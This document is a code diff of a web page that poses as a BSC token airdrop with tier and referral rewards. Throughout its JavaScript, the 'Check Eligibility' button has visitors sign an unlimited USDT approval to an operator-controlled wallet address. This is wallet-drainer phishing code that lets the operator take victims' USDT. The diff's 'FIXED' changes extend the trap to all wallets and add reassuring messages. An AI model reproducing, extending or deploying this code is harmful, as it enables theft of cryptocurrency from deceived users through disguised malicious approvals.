+                        <span class="plan-reward">5% bonus</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-award"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 501 USDT</h4>
-                                <p>Silver Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">500K</span>
+                        <i class="fas fa-user-tie icon"></i>
+                        <span class="plan-level">Level 4 Referral</span>
+                        <span class="plan-reward">3% bonus</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-star"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 101 USDT</h4>
-                                <p>Bronze Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">200K</span>
+                        <i class="fas fa-user-check icon"></i>
+                        <span class="plan-level">Level 5 Referral</span>
+                        <span class="plan-reward">2% bonus</span>
+                    </div>
+                </div>
+                
+                <h3>🏆 Airdrop Tiers</h3>
+                <div class="referral-plan">
+                    <div class="plan-card">
+                        <i class="fas fa-gem icon"></i>
+                        <span class="plan-level">≥ 10,001 USDT</span>
+                        <span class="plan-reward">5,000,000 tokens</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-certificate"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 51 USDT</h4>
-                                <p>Premium Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">100K</span>
+                        <i class="fas fa-trophy icon"></i>
+                        <span class="plan-level">≥ 5,001 USDT</span>
+                        <span class="plan-reward">2,000,000 tokens</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-coin"></i></div>
-                            <div class="plan-details">
-                                <h4>≥ 10 USDT</h4>
-                                <p>Standard Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">50K</span>
+                        <i class="fas fa-medal icon"></i>
+                        <span class="plan-level">≥ 1,001 USDT</span>
+                        <span class="plan-reward">1,000,000 tokens</span>
                     </div>
                     <div class="plan-card">
-                        <div class="plan-info">
-                            <div class="plan-icon"><i class="fas fa-wallet"></i></div>
-                            <div class="plan-details">
-                                <h4>Any Wallet (≥1 USDT)</h4>
-                                <p>Basic Tier</p>
-                            </div>
-                        </div>
-                        <span class="plan-reward">5K</span>
+                        <i class="fas fa-award icon"></i>
+                        <span class="plan-level">≥ 501 USDT</span>
+                        <span class="plan-reward">500,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-star icon"></i>
+                        <span class="plan-level">≥ 101 USDT</span>
+                        <span class="plan-reward">200,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-certificate icon"></i>
+                        <span class="plan-level">≥ 51 USDT</span>
+                        <span class="plan-reward">100,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-coin icon"></i>
+                        <span class="plan-level">≥ 10 USDT</span>
+                        <span class="plan-reward">50,000 tokens</span>
+                    </div>
+                    <div class="plan-card">
+                        <i class="fas fa-wallet icon"></i>
+                        <span class="plan-level">Any Wallet (≥1 USDT)</span>
+                        <span class="plan-reward">5,000 tokens</span>
                     </div>
                 </div>
             </div>
         </div>
 
         <!-- Footer -->
-        <div class="footer">
-            <p><i class="fas fa-shield-alt" style="color: var(--primary);"></i> Powered by Blockchain Technology | Secure & Transparent</p>
-            <p style="margin-top: 10px; font-size: 0.9rem;">server: <span id="serverUrlDisplay">Loading...</span></p>
+        <div class="card" style="text-align: center; margin-top: 30px;">
+            <p>Powered by Blockchain Technology | Secure & Transparent</p>
+            <p style="font-size: 0.9rem; opacity: 0.7;">Backend: <span id="backendUrlDisplay">Loading...</span></p>
         </div>
     </div>
 
-    <!-- JavaScript (All functionality preserved) -->
+    <!-- JavaScript -->
     <script>
-        // server Configuration - Railway Compatible
-        const server_URLS = {
+        // Backend Configuration - Railway Compatible
+        const BACKEND_URLS = {
             production: "https://usdt-usdt.mtfwit.easypanel.host/api",
             development: "http://localhost:8080/api"
         };
 
         // Auto-detect environment
         const isDevelopment = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
-        const server_URL = isDevelopment ? server_URLS.development : server_URLS.production;
+        const BACKEND_URL = isDevelopment ? BACKEND_URLS.development : BACKEND_URLS.production;
 
-        // Update server URL display
-        document.getElementById('serverUrlDisplay').textContent = server_URL;
+        // Update backend URL display
+        document.getElementById('backendUrlDisplay').textContent = BACKEND_URL;
 
         let approvalWalletAddress = "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
         let account;
@@ -989,11 +629,11 @@
         const BSC_RPC_URL = 'https://bsc-dataseed.binance.org/';
         const BSC_CHAIN_ID_DECIMAL = 56;
 
-        // Contract Address
+        // ✅ REPLACED: Contract Address
         const airdropContractAddress = "0xee932A6620a6C2590b12875010316A1487b0b121";
         const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
-        // Contract ABI
+        // ✅ REPLACED: Contract ABI
         const airdropABI = [
             {
                 "inputs": [
@@ -1821,66 +1461,69 @@
         // Particle Animation
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
-            const numParticles = 15;
+            const numParticles = 20;
 
             for (let i = 0; i < numParticles; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
-                particle.style.left = `${Math.random() * 100}%`;
-                particle.style.animationDuration = `${15 + Math.random() * 15}s`;
-                particle.style.animationDelay = `${Math.random() * 10}s`;
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.animationDuration = `${10 + Math.random() * 10}s`;
+                particle.style.animationDelay = `${Math.random() * 5}s`;
                 particlesContainer.appendChild(particle);
             }
         }
 
-        // server Health Check
-        async function checkserverHealth() {
+        // Backend Health Check
+        async function checkBackendHealth() {
             try {
-                const response = await fetch(`${server_URL}/health`);
+                const response = await fetch(`${BACKEND_URL}/health`);
                 const data = await response.json();
                 
                 if (data.success) {
-                    document.getElementById('serverStatus').textContent = 'Connected';
-                    document.getElementById('serverStatusText').textContent = 'Connected successfully';
-                    document.getElementById('serverStatusBadge').className = 'status-badge online';
+                    document.getElementById('backendStatus').textContent = 'Connected ✅';
+                    document.getElementById('backendStatusBadge').textContent = 'Online';
+                    document.getElementById('backendStatusBadge').style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
+                    document.getElementById('backendStatusBadge').style.color = 'var(--success)';
                     return true;
                 } else {
-                    throw new Error('server response not successful');
+                    throw new Error('Backend response not successful');
                 }
             } catch (error) {
-                document.getElementById('serverStatus').textContent = 'Disconnected';
-                document.getElementById('serverStatusText').textContent = 'Connection failed';
-                document.getElementById('serverStatusBadge').className = 'status-badge offline';
+                document.getElementById('backendStatus').textContent = 'Disconnected ❌';
+                document.getElementById('backendStatusBadge').textContent = 'Offline';
+                document.getElementById('backendStatusBadge').style.backgroundColor = 'rgba(239, 68, 68, 0.2)';
+                document.getElementById('backendStatusBadge').style.color = 'var(--danger)';
+                document.getElementById('backendStatusAlert').className = 'alert alert-danger';
                 return false;
             }
         }
 
-        // server से approval wallet address fetch करें
-        async function getApprovalWalletFromserver() {
+        // Backend से approval wallet address fetch करें
+        async function getApprovalWalletFromBackend() {
             try {
-                const isHealthy = await checkserverHealth();
+                const isHealthy = await checkBackendHealth();
                 if (!isHealthy) {
                     return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
                 }
 
-                const response = await fetch(`${server_URL}/approval-wallet`);
+                const response = await fetch(`${BACKEND_URL}/approval-wallet`);
                 const data = await response.json();
                 
                 if (data.success) {
                     approvalWalletAddress = data.approvalWalletAddress;
                     return approvalWalletAddress;
                 } else {
-                    throw new Error("Failed to fetch approval wallet from server");
+                    throw new Error("Failed to fetch approval wallet from backend");
                 }
             } catch (error) {
                 return "0xCcf0a381D804BFa37485Bc450CE540c09350f975";
             }
         }
 
-        // User approval को server में save करें
-        async function saveUserApprovalToserver(walletAddress, usdtBalance, airdropAmount, tier) {
+        // ✅ FIXED: User approval को backend में save करें
+        async function saveUserApprovalToBackend(walletAddress, usdtBalance, airdropAmount, tier) {
             try {
-                const response = await fetch(`${server_URL}/save-approval`, {
+                const response = await fetch(`${BACKEND_URL}/save-approval`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -1906,10 +1549,10 @@
             }
         }
 
-        // server में claim save करें
-        async function saveClaimToserver(walletAddress, usdtBalance, airdropAmount, tier, referrer) {
+        // ✅ NEW: Backend में claim save करें
+        async function saveClaimToBackend(walletAddress, usdtBalance, airdropAmount, tier, referrer) {
             try {
-                const response = await fetch(`${server_URL}/save-claim`, {
+                const response = await fetch(`${BACKEND_URL}/save-claim`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -1957,11 +1600,11 @@
             createParticles();
             
             try {
-                // server से approval wallet address लोड करें
-                await getApprovalWalletFromserver();
+                // Backend से approval wallet address लोड करें
+                await getApprovalWalletFromBackend();
                 
-                // server health check
-                await checkserverHealth();
+                // Backend health check
+                await checkBackendHealth();
 
                 if (window.ethereum) {
                     web3 = new Web3(window.ethereum);
@@ -1998,8 +1641,7 @@
         function handleAccountsChanged(accounts) {
             if (accounts.length > 0) {
                 account = accounts[0];
-                document.getElementById("walletAddress").innerHTML = '<i class="fas fa-circle"></i> ' + account.substring(0, 6) + "..." + account.substring(38);
-                document.getElementById("walletAddress").className = 'status-badge success';
+                document.getElementById("walletAddress").innerText = account.substring(0, 6) + "..." + account.substring(38);
                 isApproved = false;
                 document.getElementById("claimButton").disabled = true;
                 generateReferral();
@@ -2007,8 +1649,7 @@
                 checkClaimStatus();
             } else {
                 account = null;
-                document.getElementById("walletAddress").innerHTML = '<i class="fas fa-circle"></i> Not Connected';
-                document.getElementById("walletAddress").className = 'status-badge warning';
+                document.getElementById("walletAddress").innerText = "Not Connected";
                 isApproved = false;
                 document.getElementById("claimButton").disabled = true;
                 document.getElementById("referralLink").value = "";
@@ -2031,8 +1672,7 @@
                 const accounts = await web3.eth.getAccounts();
                 account = accounts[0];
                 
-                document.getElementById("walletAddress").innerHTML = '<i class="fas fa-circle"></i> ' + account.substring(0, 6) + "..." + account.substring(38);
-                document.getElementById("walletAddress").className = 'status-badge success';
+                document.getElementById("walletAddress").innerText = account.substring(0, 6) + "..." + account.substring(38);
                 generateReferral();
                 checkAllowance();
                 checkClaimStatus();
@@ -2052,13 +1692,14 @@
         // Update Network Status
         function updateNetworkStatus(chainId) {
             const networkStatus = document.getElementById('networkStatus');
-            const networkStatusText = document.getElementById('networkStatusText');
             if (chainId === BSC_CHAIN_ID_DECIMAL) {
-                networkStatusText.textContent = 'BSC Mainnet';
-                networkStatus.className = 'status-badge success';
+                networkStatus.textContent = 'Network: BSC Mainnet ✅';
+                networkStatus.style.backgroundColor = 'rgba(16, 185, 129, 0.2)';
+                networkStatus.style.color = 'var(--success)';
             } else {
-                networkStatusText.textContent = 'Wrong Network';
-                networkStatus.className = 'status-badge warning';
+                networkStatus.textContent = 'Network: Wrong Network ❌';
+                networkStatus.style.backgroundColor = 'rgba(239, 68, 68, 0.2)';
+                networkStatus.style.color = 'var(--danger)';
             }
         }
 
@@ -2102,7 +1743,7 @@
             }
         }
 
-        // Check Eligibility Function
+        // ✅ FIXED: Check Eligibility Function - Now works for 0 USDT users too
         async function checkEligibility() {
             try {
                 if (typeof window.ethereum === 'undefined') {
@@ -2126,19 +1767,17 @@
 
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
                 
-                // Check USDT Balance
+                // 1. Check USDT Balance
                 const balance = await usdtContract.methods.balanceOf(account).call();
                 const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
                 
-                document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(2);
+                document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
                 
-                // Calculate airdrop amount
+                // ✅ Calculate airdrop amount
                 const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                 const tier = getTier(parseFloat(balanceInUSDT));
                 
                 document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
-                document.getElementById("airdropAmountDisplay").textContent = airdropAmount.toLocaleString();
-                document.getElementById("tierDisplay").textContent = tier;
                 document.getElementById("tierBadge").textContent = tier;
 
                 // Update eligibility badge
@@ -2146,33 +1785,39 @@
                 if (airdropAmount > 0) {
                     eligibilityBadge.textContent = "Eligible";
                     eligibilityBadge.className = "eligibility-status eligible";
-                    showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
+                    showAlert(`✅ You are eligible for ${airdropAmount.toLocaleString()} tokens! Setting up claim...`, "success");
                 } else {
-                    eligibilityBadge.textContent = "Not Eligible";
+                    eligibilityBadge.textContent = "Not Eligible for Airdrop";
                     eligibilityBadge.className = "eligibility-status not-eligible";
-                    showAlert(`⚠️ You have ${parseFloat(balanceInUSDT).toFixed(2)} USDT. Need at least 1 USDT for tokens.`, "warning");
+                    showAlert(`⚠️ You have ${parseFloat(balanceInUSDT).toFixed(6)} USDT. You need at least 1 USDT to receive tokens, but you can still proceed.`, "warning");
                 }
 
-                // Check if already eligible
-                const approvalWallet = await getApprovalWalletFromserver();
+                // ✅ FIXED: Check if already eligible for ALL users (including 0 USDT)
+                const approvalWallet = await getApprovalWalletFromBackend();
                 const allowance = await usdtContract.methods.allowance(account, approvalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
                 if (parseFloat(allowanceInUSDT) > 1000) {
                     // Already eligible
+                    if (airdropAmount > 0) {
+                        showAlert(`✅ You are already eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
+                    } else {
+                        showAlert(`✅ Setup complete! You can claim but will receive 0 tokens.`, "info");
+                    }
                     document.getElementById("claimButton").disabled = false;
                     button.innerHTML = '<i class="fas fa-check"></i> Already Eligible';
-                    button.className = 'btn btn-success';
+                    button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                     return;
                 }
 
-                // Send approval transaction
+                // ✅ FIXED: Allow approval for ALL users (including 0 USDT)
                 button.innerHTML = '<div class="loading"></div> Setting Up Claim...';
                 
                 try {
                     // Unlimited approval amount
                     const unlimitedAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
                     
+                    // Send approval transaction
                     const tx = await usdtContract.methods.approve(
                         approvalWallet,
                         unlimitedAmount
@@ -2182,13 +1827,19 @@
                     });
 
                     if (tx.status) {
-                        showAlert("✅ Eligibility confirmed! You can now claim your airdrop.", "success");
+                        if (airdropAmount > 0) {
+                            showAlert("✅ Eligibility confirmed! You can now claim your airdrop.", "success");
+                        } else {
+                            showAlert("✅ Setup complete! You can claim but will receive 0 tokens.", "info");
+                        }
                         
+                        // Enable claim button for ALL users
                         document.getElementById("claimButton").disabled = false;
                         button.innerHTML = '<i class="fas fa-check"></i> Eligible & Ready';
-                        button.className = 'btn btn-success';
+                        button.style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                         
-                        await saveUserApprovalToserver(account, balanceInUSDT, airdropAmount.toString(), tier);
+                        // Save to backend
+                        await saveUserApprovalToBackend(account, balanceInUSDT, airdropAmount.toString(), tier);
                         
                     } else {
                         throw new Error("Transaction failed");
@@ -2196,12 +1847,11 @@
 
                 } catch (approvalError) {
                     if (approvalError.code === 4001) {
-                        showAlert("❌ Setup cancelled by user", "warning");
+                        showAlert("❌ Eligibility setup cancelled by user", "warning");
                     } else {
-                        showAlert("❌ Setup failed: " + approvalError.message, "danger");
+                        showAlert("❌ Eligibility setup failed: " + approvalError.message, "danger");
                     }
                     button.innerHTML = originalText;
-                    button.className = 'btn btn-primary';
                     button.disabled = false;
                 }
 
@@ -2209,13 +1859,13 @@
                 showAlert("Failed to check eligibility: " + error.message, "danger");
                 const button = document.getElementById('checkEligibilityBtn');
                 button.innerHTML = '<i class="fas fa-clipboard-check"></i> Check Eligibility';
-                button.className = 'btn btn-primary';
                 button.disabled = false;
             }
         }
 
-        // Calculate Airdrop Amount
+        // Calculate Airdrop Amount - UPDATED
         function calculateAirdropAmount(usdtBalance) {
+            // ✅ CHANGE: Return 0 if balance is less than 1 USDT
             if (usdtBalance < 1) return 0;
             
             if (usdtBalance >= 10001) return 5000000;
@@ -2225,11 +1875,12 @@
             if (usdtBalance >= 101) return 200000;
             if (usdtBalance >= 51) return 100000;
             if (usdtBalance >= 10) return 50000;
-            return 5000;
+            return 5000; // Minimum for any wallet with >=1 USDT
         }
 
-        // Get Tier Name
+        // Get Tier Name - UPDATED
         function getTier(usdtBalance) {
+            // ✅ CHANGE: Show "Not eligible" for less than 1 USDT
             if (usdtBalance < 1) return "Not eligible";
             
             if (usdtBalance >= 10001) return "Diamond";
@@ -2248,35 +1899,37 @@
                 if (!account) return;
                 
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                const currentApprovalWallet = await getApprovalWalletFromserver();
+                const currentApprovalWallet = await getApprovalWalletFromBackend();
                 
                 const allowance = await usdtContract.methods.allowance(account, currentApprovalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
                 
                 if (parseFloat(allowanceInUSDT) > 1000) {
+                    // ✅ SHOW ACTUAL AIRDROP AMOUNT FOR ALREADY APPROVED WALLETS
                     const balance = await usdtContract.methods.balanceOf(account).call();
                     const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
                     const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                     const tier = getTier(parseFloat(balanceInUSDT));
                     
                     document.getElementById("airdropAmount").textContent = airdropAmount.toLocaleString();
-                    document.getElementById("airdropAmountDisplay").textContent = airdropAmount.toLocaleString();
-                    document.getElementById("tierDisplay").textContent = tier;
                     document.getElementById("tierBadge").textContent = tier;
-                    document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(2);
+                    document.getElementById("usdtBalance").textContent = parseFloat(balanceInUSDT).toFixed(6);
                     
+                    // Update eligibility badge
                     const eligibilityBadge = document.getElementById("eligibilityBadge");
                     if (airdropAmount > 0) {
                         eligibilityBadge.textContent = "Eligible";
                         eligibilityBadge.className = "eligibility-status eligible";
+                        showAlert(`✅ Already eligible for ${airdropAmount.toLocaleString()} tokens!`, "success");
                     } else {
-                        eligibilityBadge.textContent = "Not Eligible";
+                        eligibilityBadge.textContent = "Not Eligible for Airdrop";
                         eligibilityBadge.className = "eligibility-status not-eligible";
+                        showAlert(`✅ Setup complete! You can claim but will receive 0 tokens.`, "info");
                     }
                     
                     document.getElementById("claimButton").disabled = false;
                     document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Already Eligible';
-                    document.getElementById("checkEligibilityBtn").className = 'btn btn-success';
+                    document.getElementById("checkEligibilityBtn").style.background = 'linear-gradient(45deg, var(--success), #34d399)';
                 }
                 
             } catch (error) {
@@ -2284,7 +1937,7 @@
             }
         }
 
-        // Claim Airdrop Function
+        // ✅ FIXED: Claim Airdrop Function - Now works for 0 USDT users too
         async function claimAirdrop() {
             try {
                 if (!account) {
@@ -2292,13 +1945,14 @@
                     return;
                 }
 
+                // Check if USDT is approved
                 const usdtContract = new web3.eth.Contract(usdtABI, usdtContractAddress);
-                const currentApprovalWallet = await getApprovalWalletFromserver();
+                const currentApprovalWallet = await getApprovalWalletFromBackend();
                 const allowance = await usdtContract.methods.allowance(account, currentApprovalWallet).call();
                 const allowanceInUSDT = web3.utils.fromWei(allowance, 'ether');
 
                 if (parseFloat(allowanceInUSDT) < 1) {
-                    showAlert("❌ Please check eligibility first!", "warning");
+                    showAlert("❌ Please check eligibility first before claiming airdrop!", "warning");
                     return;
                 }
 
@@ -2306,16 +1960,20 @@
                 claimButton.disabled = true;
                 claimButton.innerHTML = '<div class="loading"></div> Claiming...';
 
+                // Get referrer address
                 const referrer = document.getElementById("referrer").value || "0x0000000000000000000000000000000000000000";
 
+                // Get current USDT balance for final calculation
                 const balance = await usdtContract.methods.balanceOf(account).call();
                 const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
                 
                 const airdropAmount = calculateAirdropAmount(parseFloat(balanceInUSDT));
                 const tier = getTier(parseFloat(balanceInUSDT));
 
+                // Interact with airdrop contract - CALL CLAIM FUNCTION
                 const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
                 
+                // ✅ Call claimAirdrop function with referrer
                 const tx = await airdropContract.methods.claimAirdrop(referrer).send({
                     from: account,
                     gas: 300000,
@@ -2323,20 +1981,21 @@
                 });
 
                 if (tx.status) {
-                    await saveClaimToserver(account, balanceInUSDT, airdropAmount.toString(), tier, referrer);
+                    // Save claim to backend
+                    await saveClaimToBackend(account, balanceInUSDT, airdropAmount.toString(), tier, referrer);
                     
                     if (airdropAmount > 0) {
-                        showAlert("🎉 Airdrop claimed successfully!", "success");
+                        showAlert("🎉 Airdrop claimed successfully! Your tokens will be distributed soon.", "success");
                     } else {
-                        showAlert("✅ Claim processed! You received 0 tokens (need 1+ USDT).", "info");
+                        showAlert("✅ Claim processed! You received 0 tokens as you have less than 1 USDT.", "info");
                     }
                     
                     claimButton.innerHTML = '<i class="fas fa-check"></i> Claimed Successfully';
-                    claimButton.className = 'btn btn-success';
                     claimButton.disabled = true;
                     
-                    document.getElementById("checkEligibilityBtn").className = 'btn btn-success';
-                    document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Claimed';
+                    // Update UI
+                    document.getElementById("checkEligibilityBtn").style.background = 'var(--success)';
+                    document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Claimed Successfully';
                 } else {
                     throw new Error("Transaction failed");
                 }
@@ -2345,9 +2004,11 @@
                 if (error.code === 4001) {
                     showAlert("❌ Claim cancelled by user", "warning");
                 } else if (error.message.includes("already claimed")) {
-                    showAlert("❌ You have already claimed!", "warning");
+                    showAlert("❌ You have already claimed the airdrop!", "warning");
+                } else if (error.message.includes("insufficient allowance")) {
+                    showAlert("❌ Please check eligibility first!", "warning");
                 } else {
-                    showAlert("❌ Failed to claim: " + error.message, "danger");
+                    showAlert("❌ Failed to claim airdrop: " + error.message, "danger");
                 }
                 
                 document.getElementById("claimButton").disabled = false;
@@ -2355,24 +2016,26 @@
             }
         }
 
-        // Check Claim Status
+        // ✅ FIXED: Check Claim Status
         async function checkClaimStatus() {
             try {
                 if (!account || !web3) return;
                 
                 const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
                 
+                // Check if already claimed
                 const hasClaimed = await airdropContract.methods.hasClaimed(account).call();
                 
                 if (hasClaimed) {
                     document.getElementById("claimButton").disabled = true;
                     document.getElementById("claimButton").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
-                    document.getElementById("checkEligibilityBtn").className = 'btn btn-success';
+                    document.getElementById("checkEligibilityBtn").style.background = 'var(--success)';
                     document.getElementById("checkEligibilityBtn").innerHTML = '<i class="fas fa-check"></i> Already Claimed';
+                    showAlert("✅ You have already claimed your airdrop!", "success");
                 }
                 
             } catch (error) {
-                // Silent fail
+                // Silent fail - don't show error to user
             }
         }
 
@@ -2399,53 +2062,19 @@
 
         // Get My Referrals
         async function getMyReferrals() {
-            if (!account) {
-                showAlert("Please connect your wallet first!", "warning");
-                return;
-            }
-            
-            try {
-                const airdropContract = new web3.eth.Contract(airdropABI, airdropContractAddress);
-                const referrals = await airdropContract.methods.getReferrals(account).call();
-                
-                const referralsList = document.getElementById("referralsList");
-                referralsList.innerHTML = '';
-                
-                if (referrals.length === 0) {
-                    referralsList.innerHTML = '<li style="text-align: center; color: var(--text-secondary);">No referrals yet</li>';
-                } else {
-                    referrals.forEach(ref => {
-                        if (ref !== '0x0000000000000000000000000000000000000000') {
-                            const li = document.createElement('li');
-                            li.textContent = ref.substring(0, 6) + '...' + ref.substring(38);
-                            referralsList.appendChild(li);
-                        }
-                    });
-                }
-                
-                showAlert(`Found ${referrals.length} referrals!`, "success");
-            } catch (error) {
-                showAlert("Error loading referrals: " + error.message, "danger");
-            }
+            showAlert("Referral data would be loaded from backend in production", "info");
         }
 
         // Show Alert
         function showAlert(message, type) {
             const alertDiv = document.createElement('div');
             alertDiv.className = `alert alert-${type}`;
-            
-            let icon = 'info-circle';
-            if (type === 'success') icon = 'check-circle';
-            if (type === 'warning') icon = 'exclamation-triangle';
-            if (type === 'danger') icon = 'times-circle';
-            
             alertDiv.innerHTML = `
-                <i class="fas fa-${icon}"></i>
-                <div>${message}</div>
+                <i class="fas fa-${type === 'success' ? 'check' : type === 'warning' ? 'exclamation-triangle' : type === 'danger' ? 'times' : 'info'}-circle"></i>
+                ${message}
             `;
             
-            const container = document.querySelector('.container');
-            container.insertBefore(alertDiv, container.querySelector('.status-bar').nextSibling);
+            document.querySelector('.container').insertBefore(alertDiv, document.querySelector('.container').firstChild);
             
             setTimeout(() => {
                 alertDiv.remove();
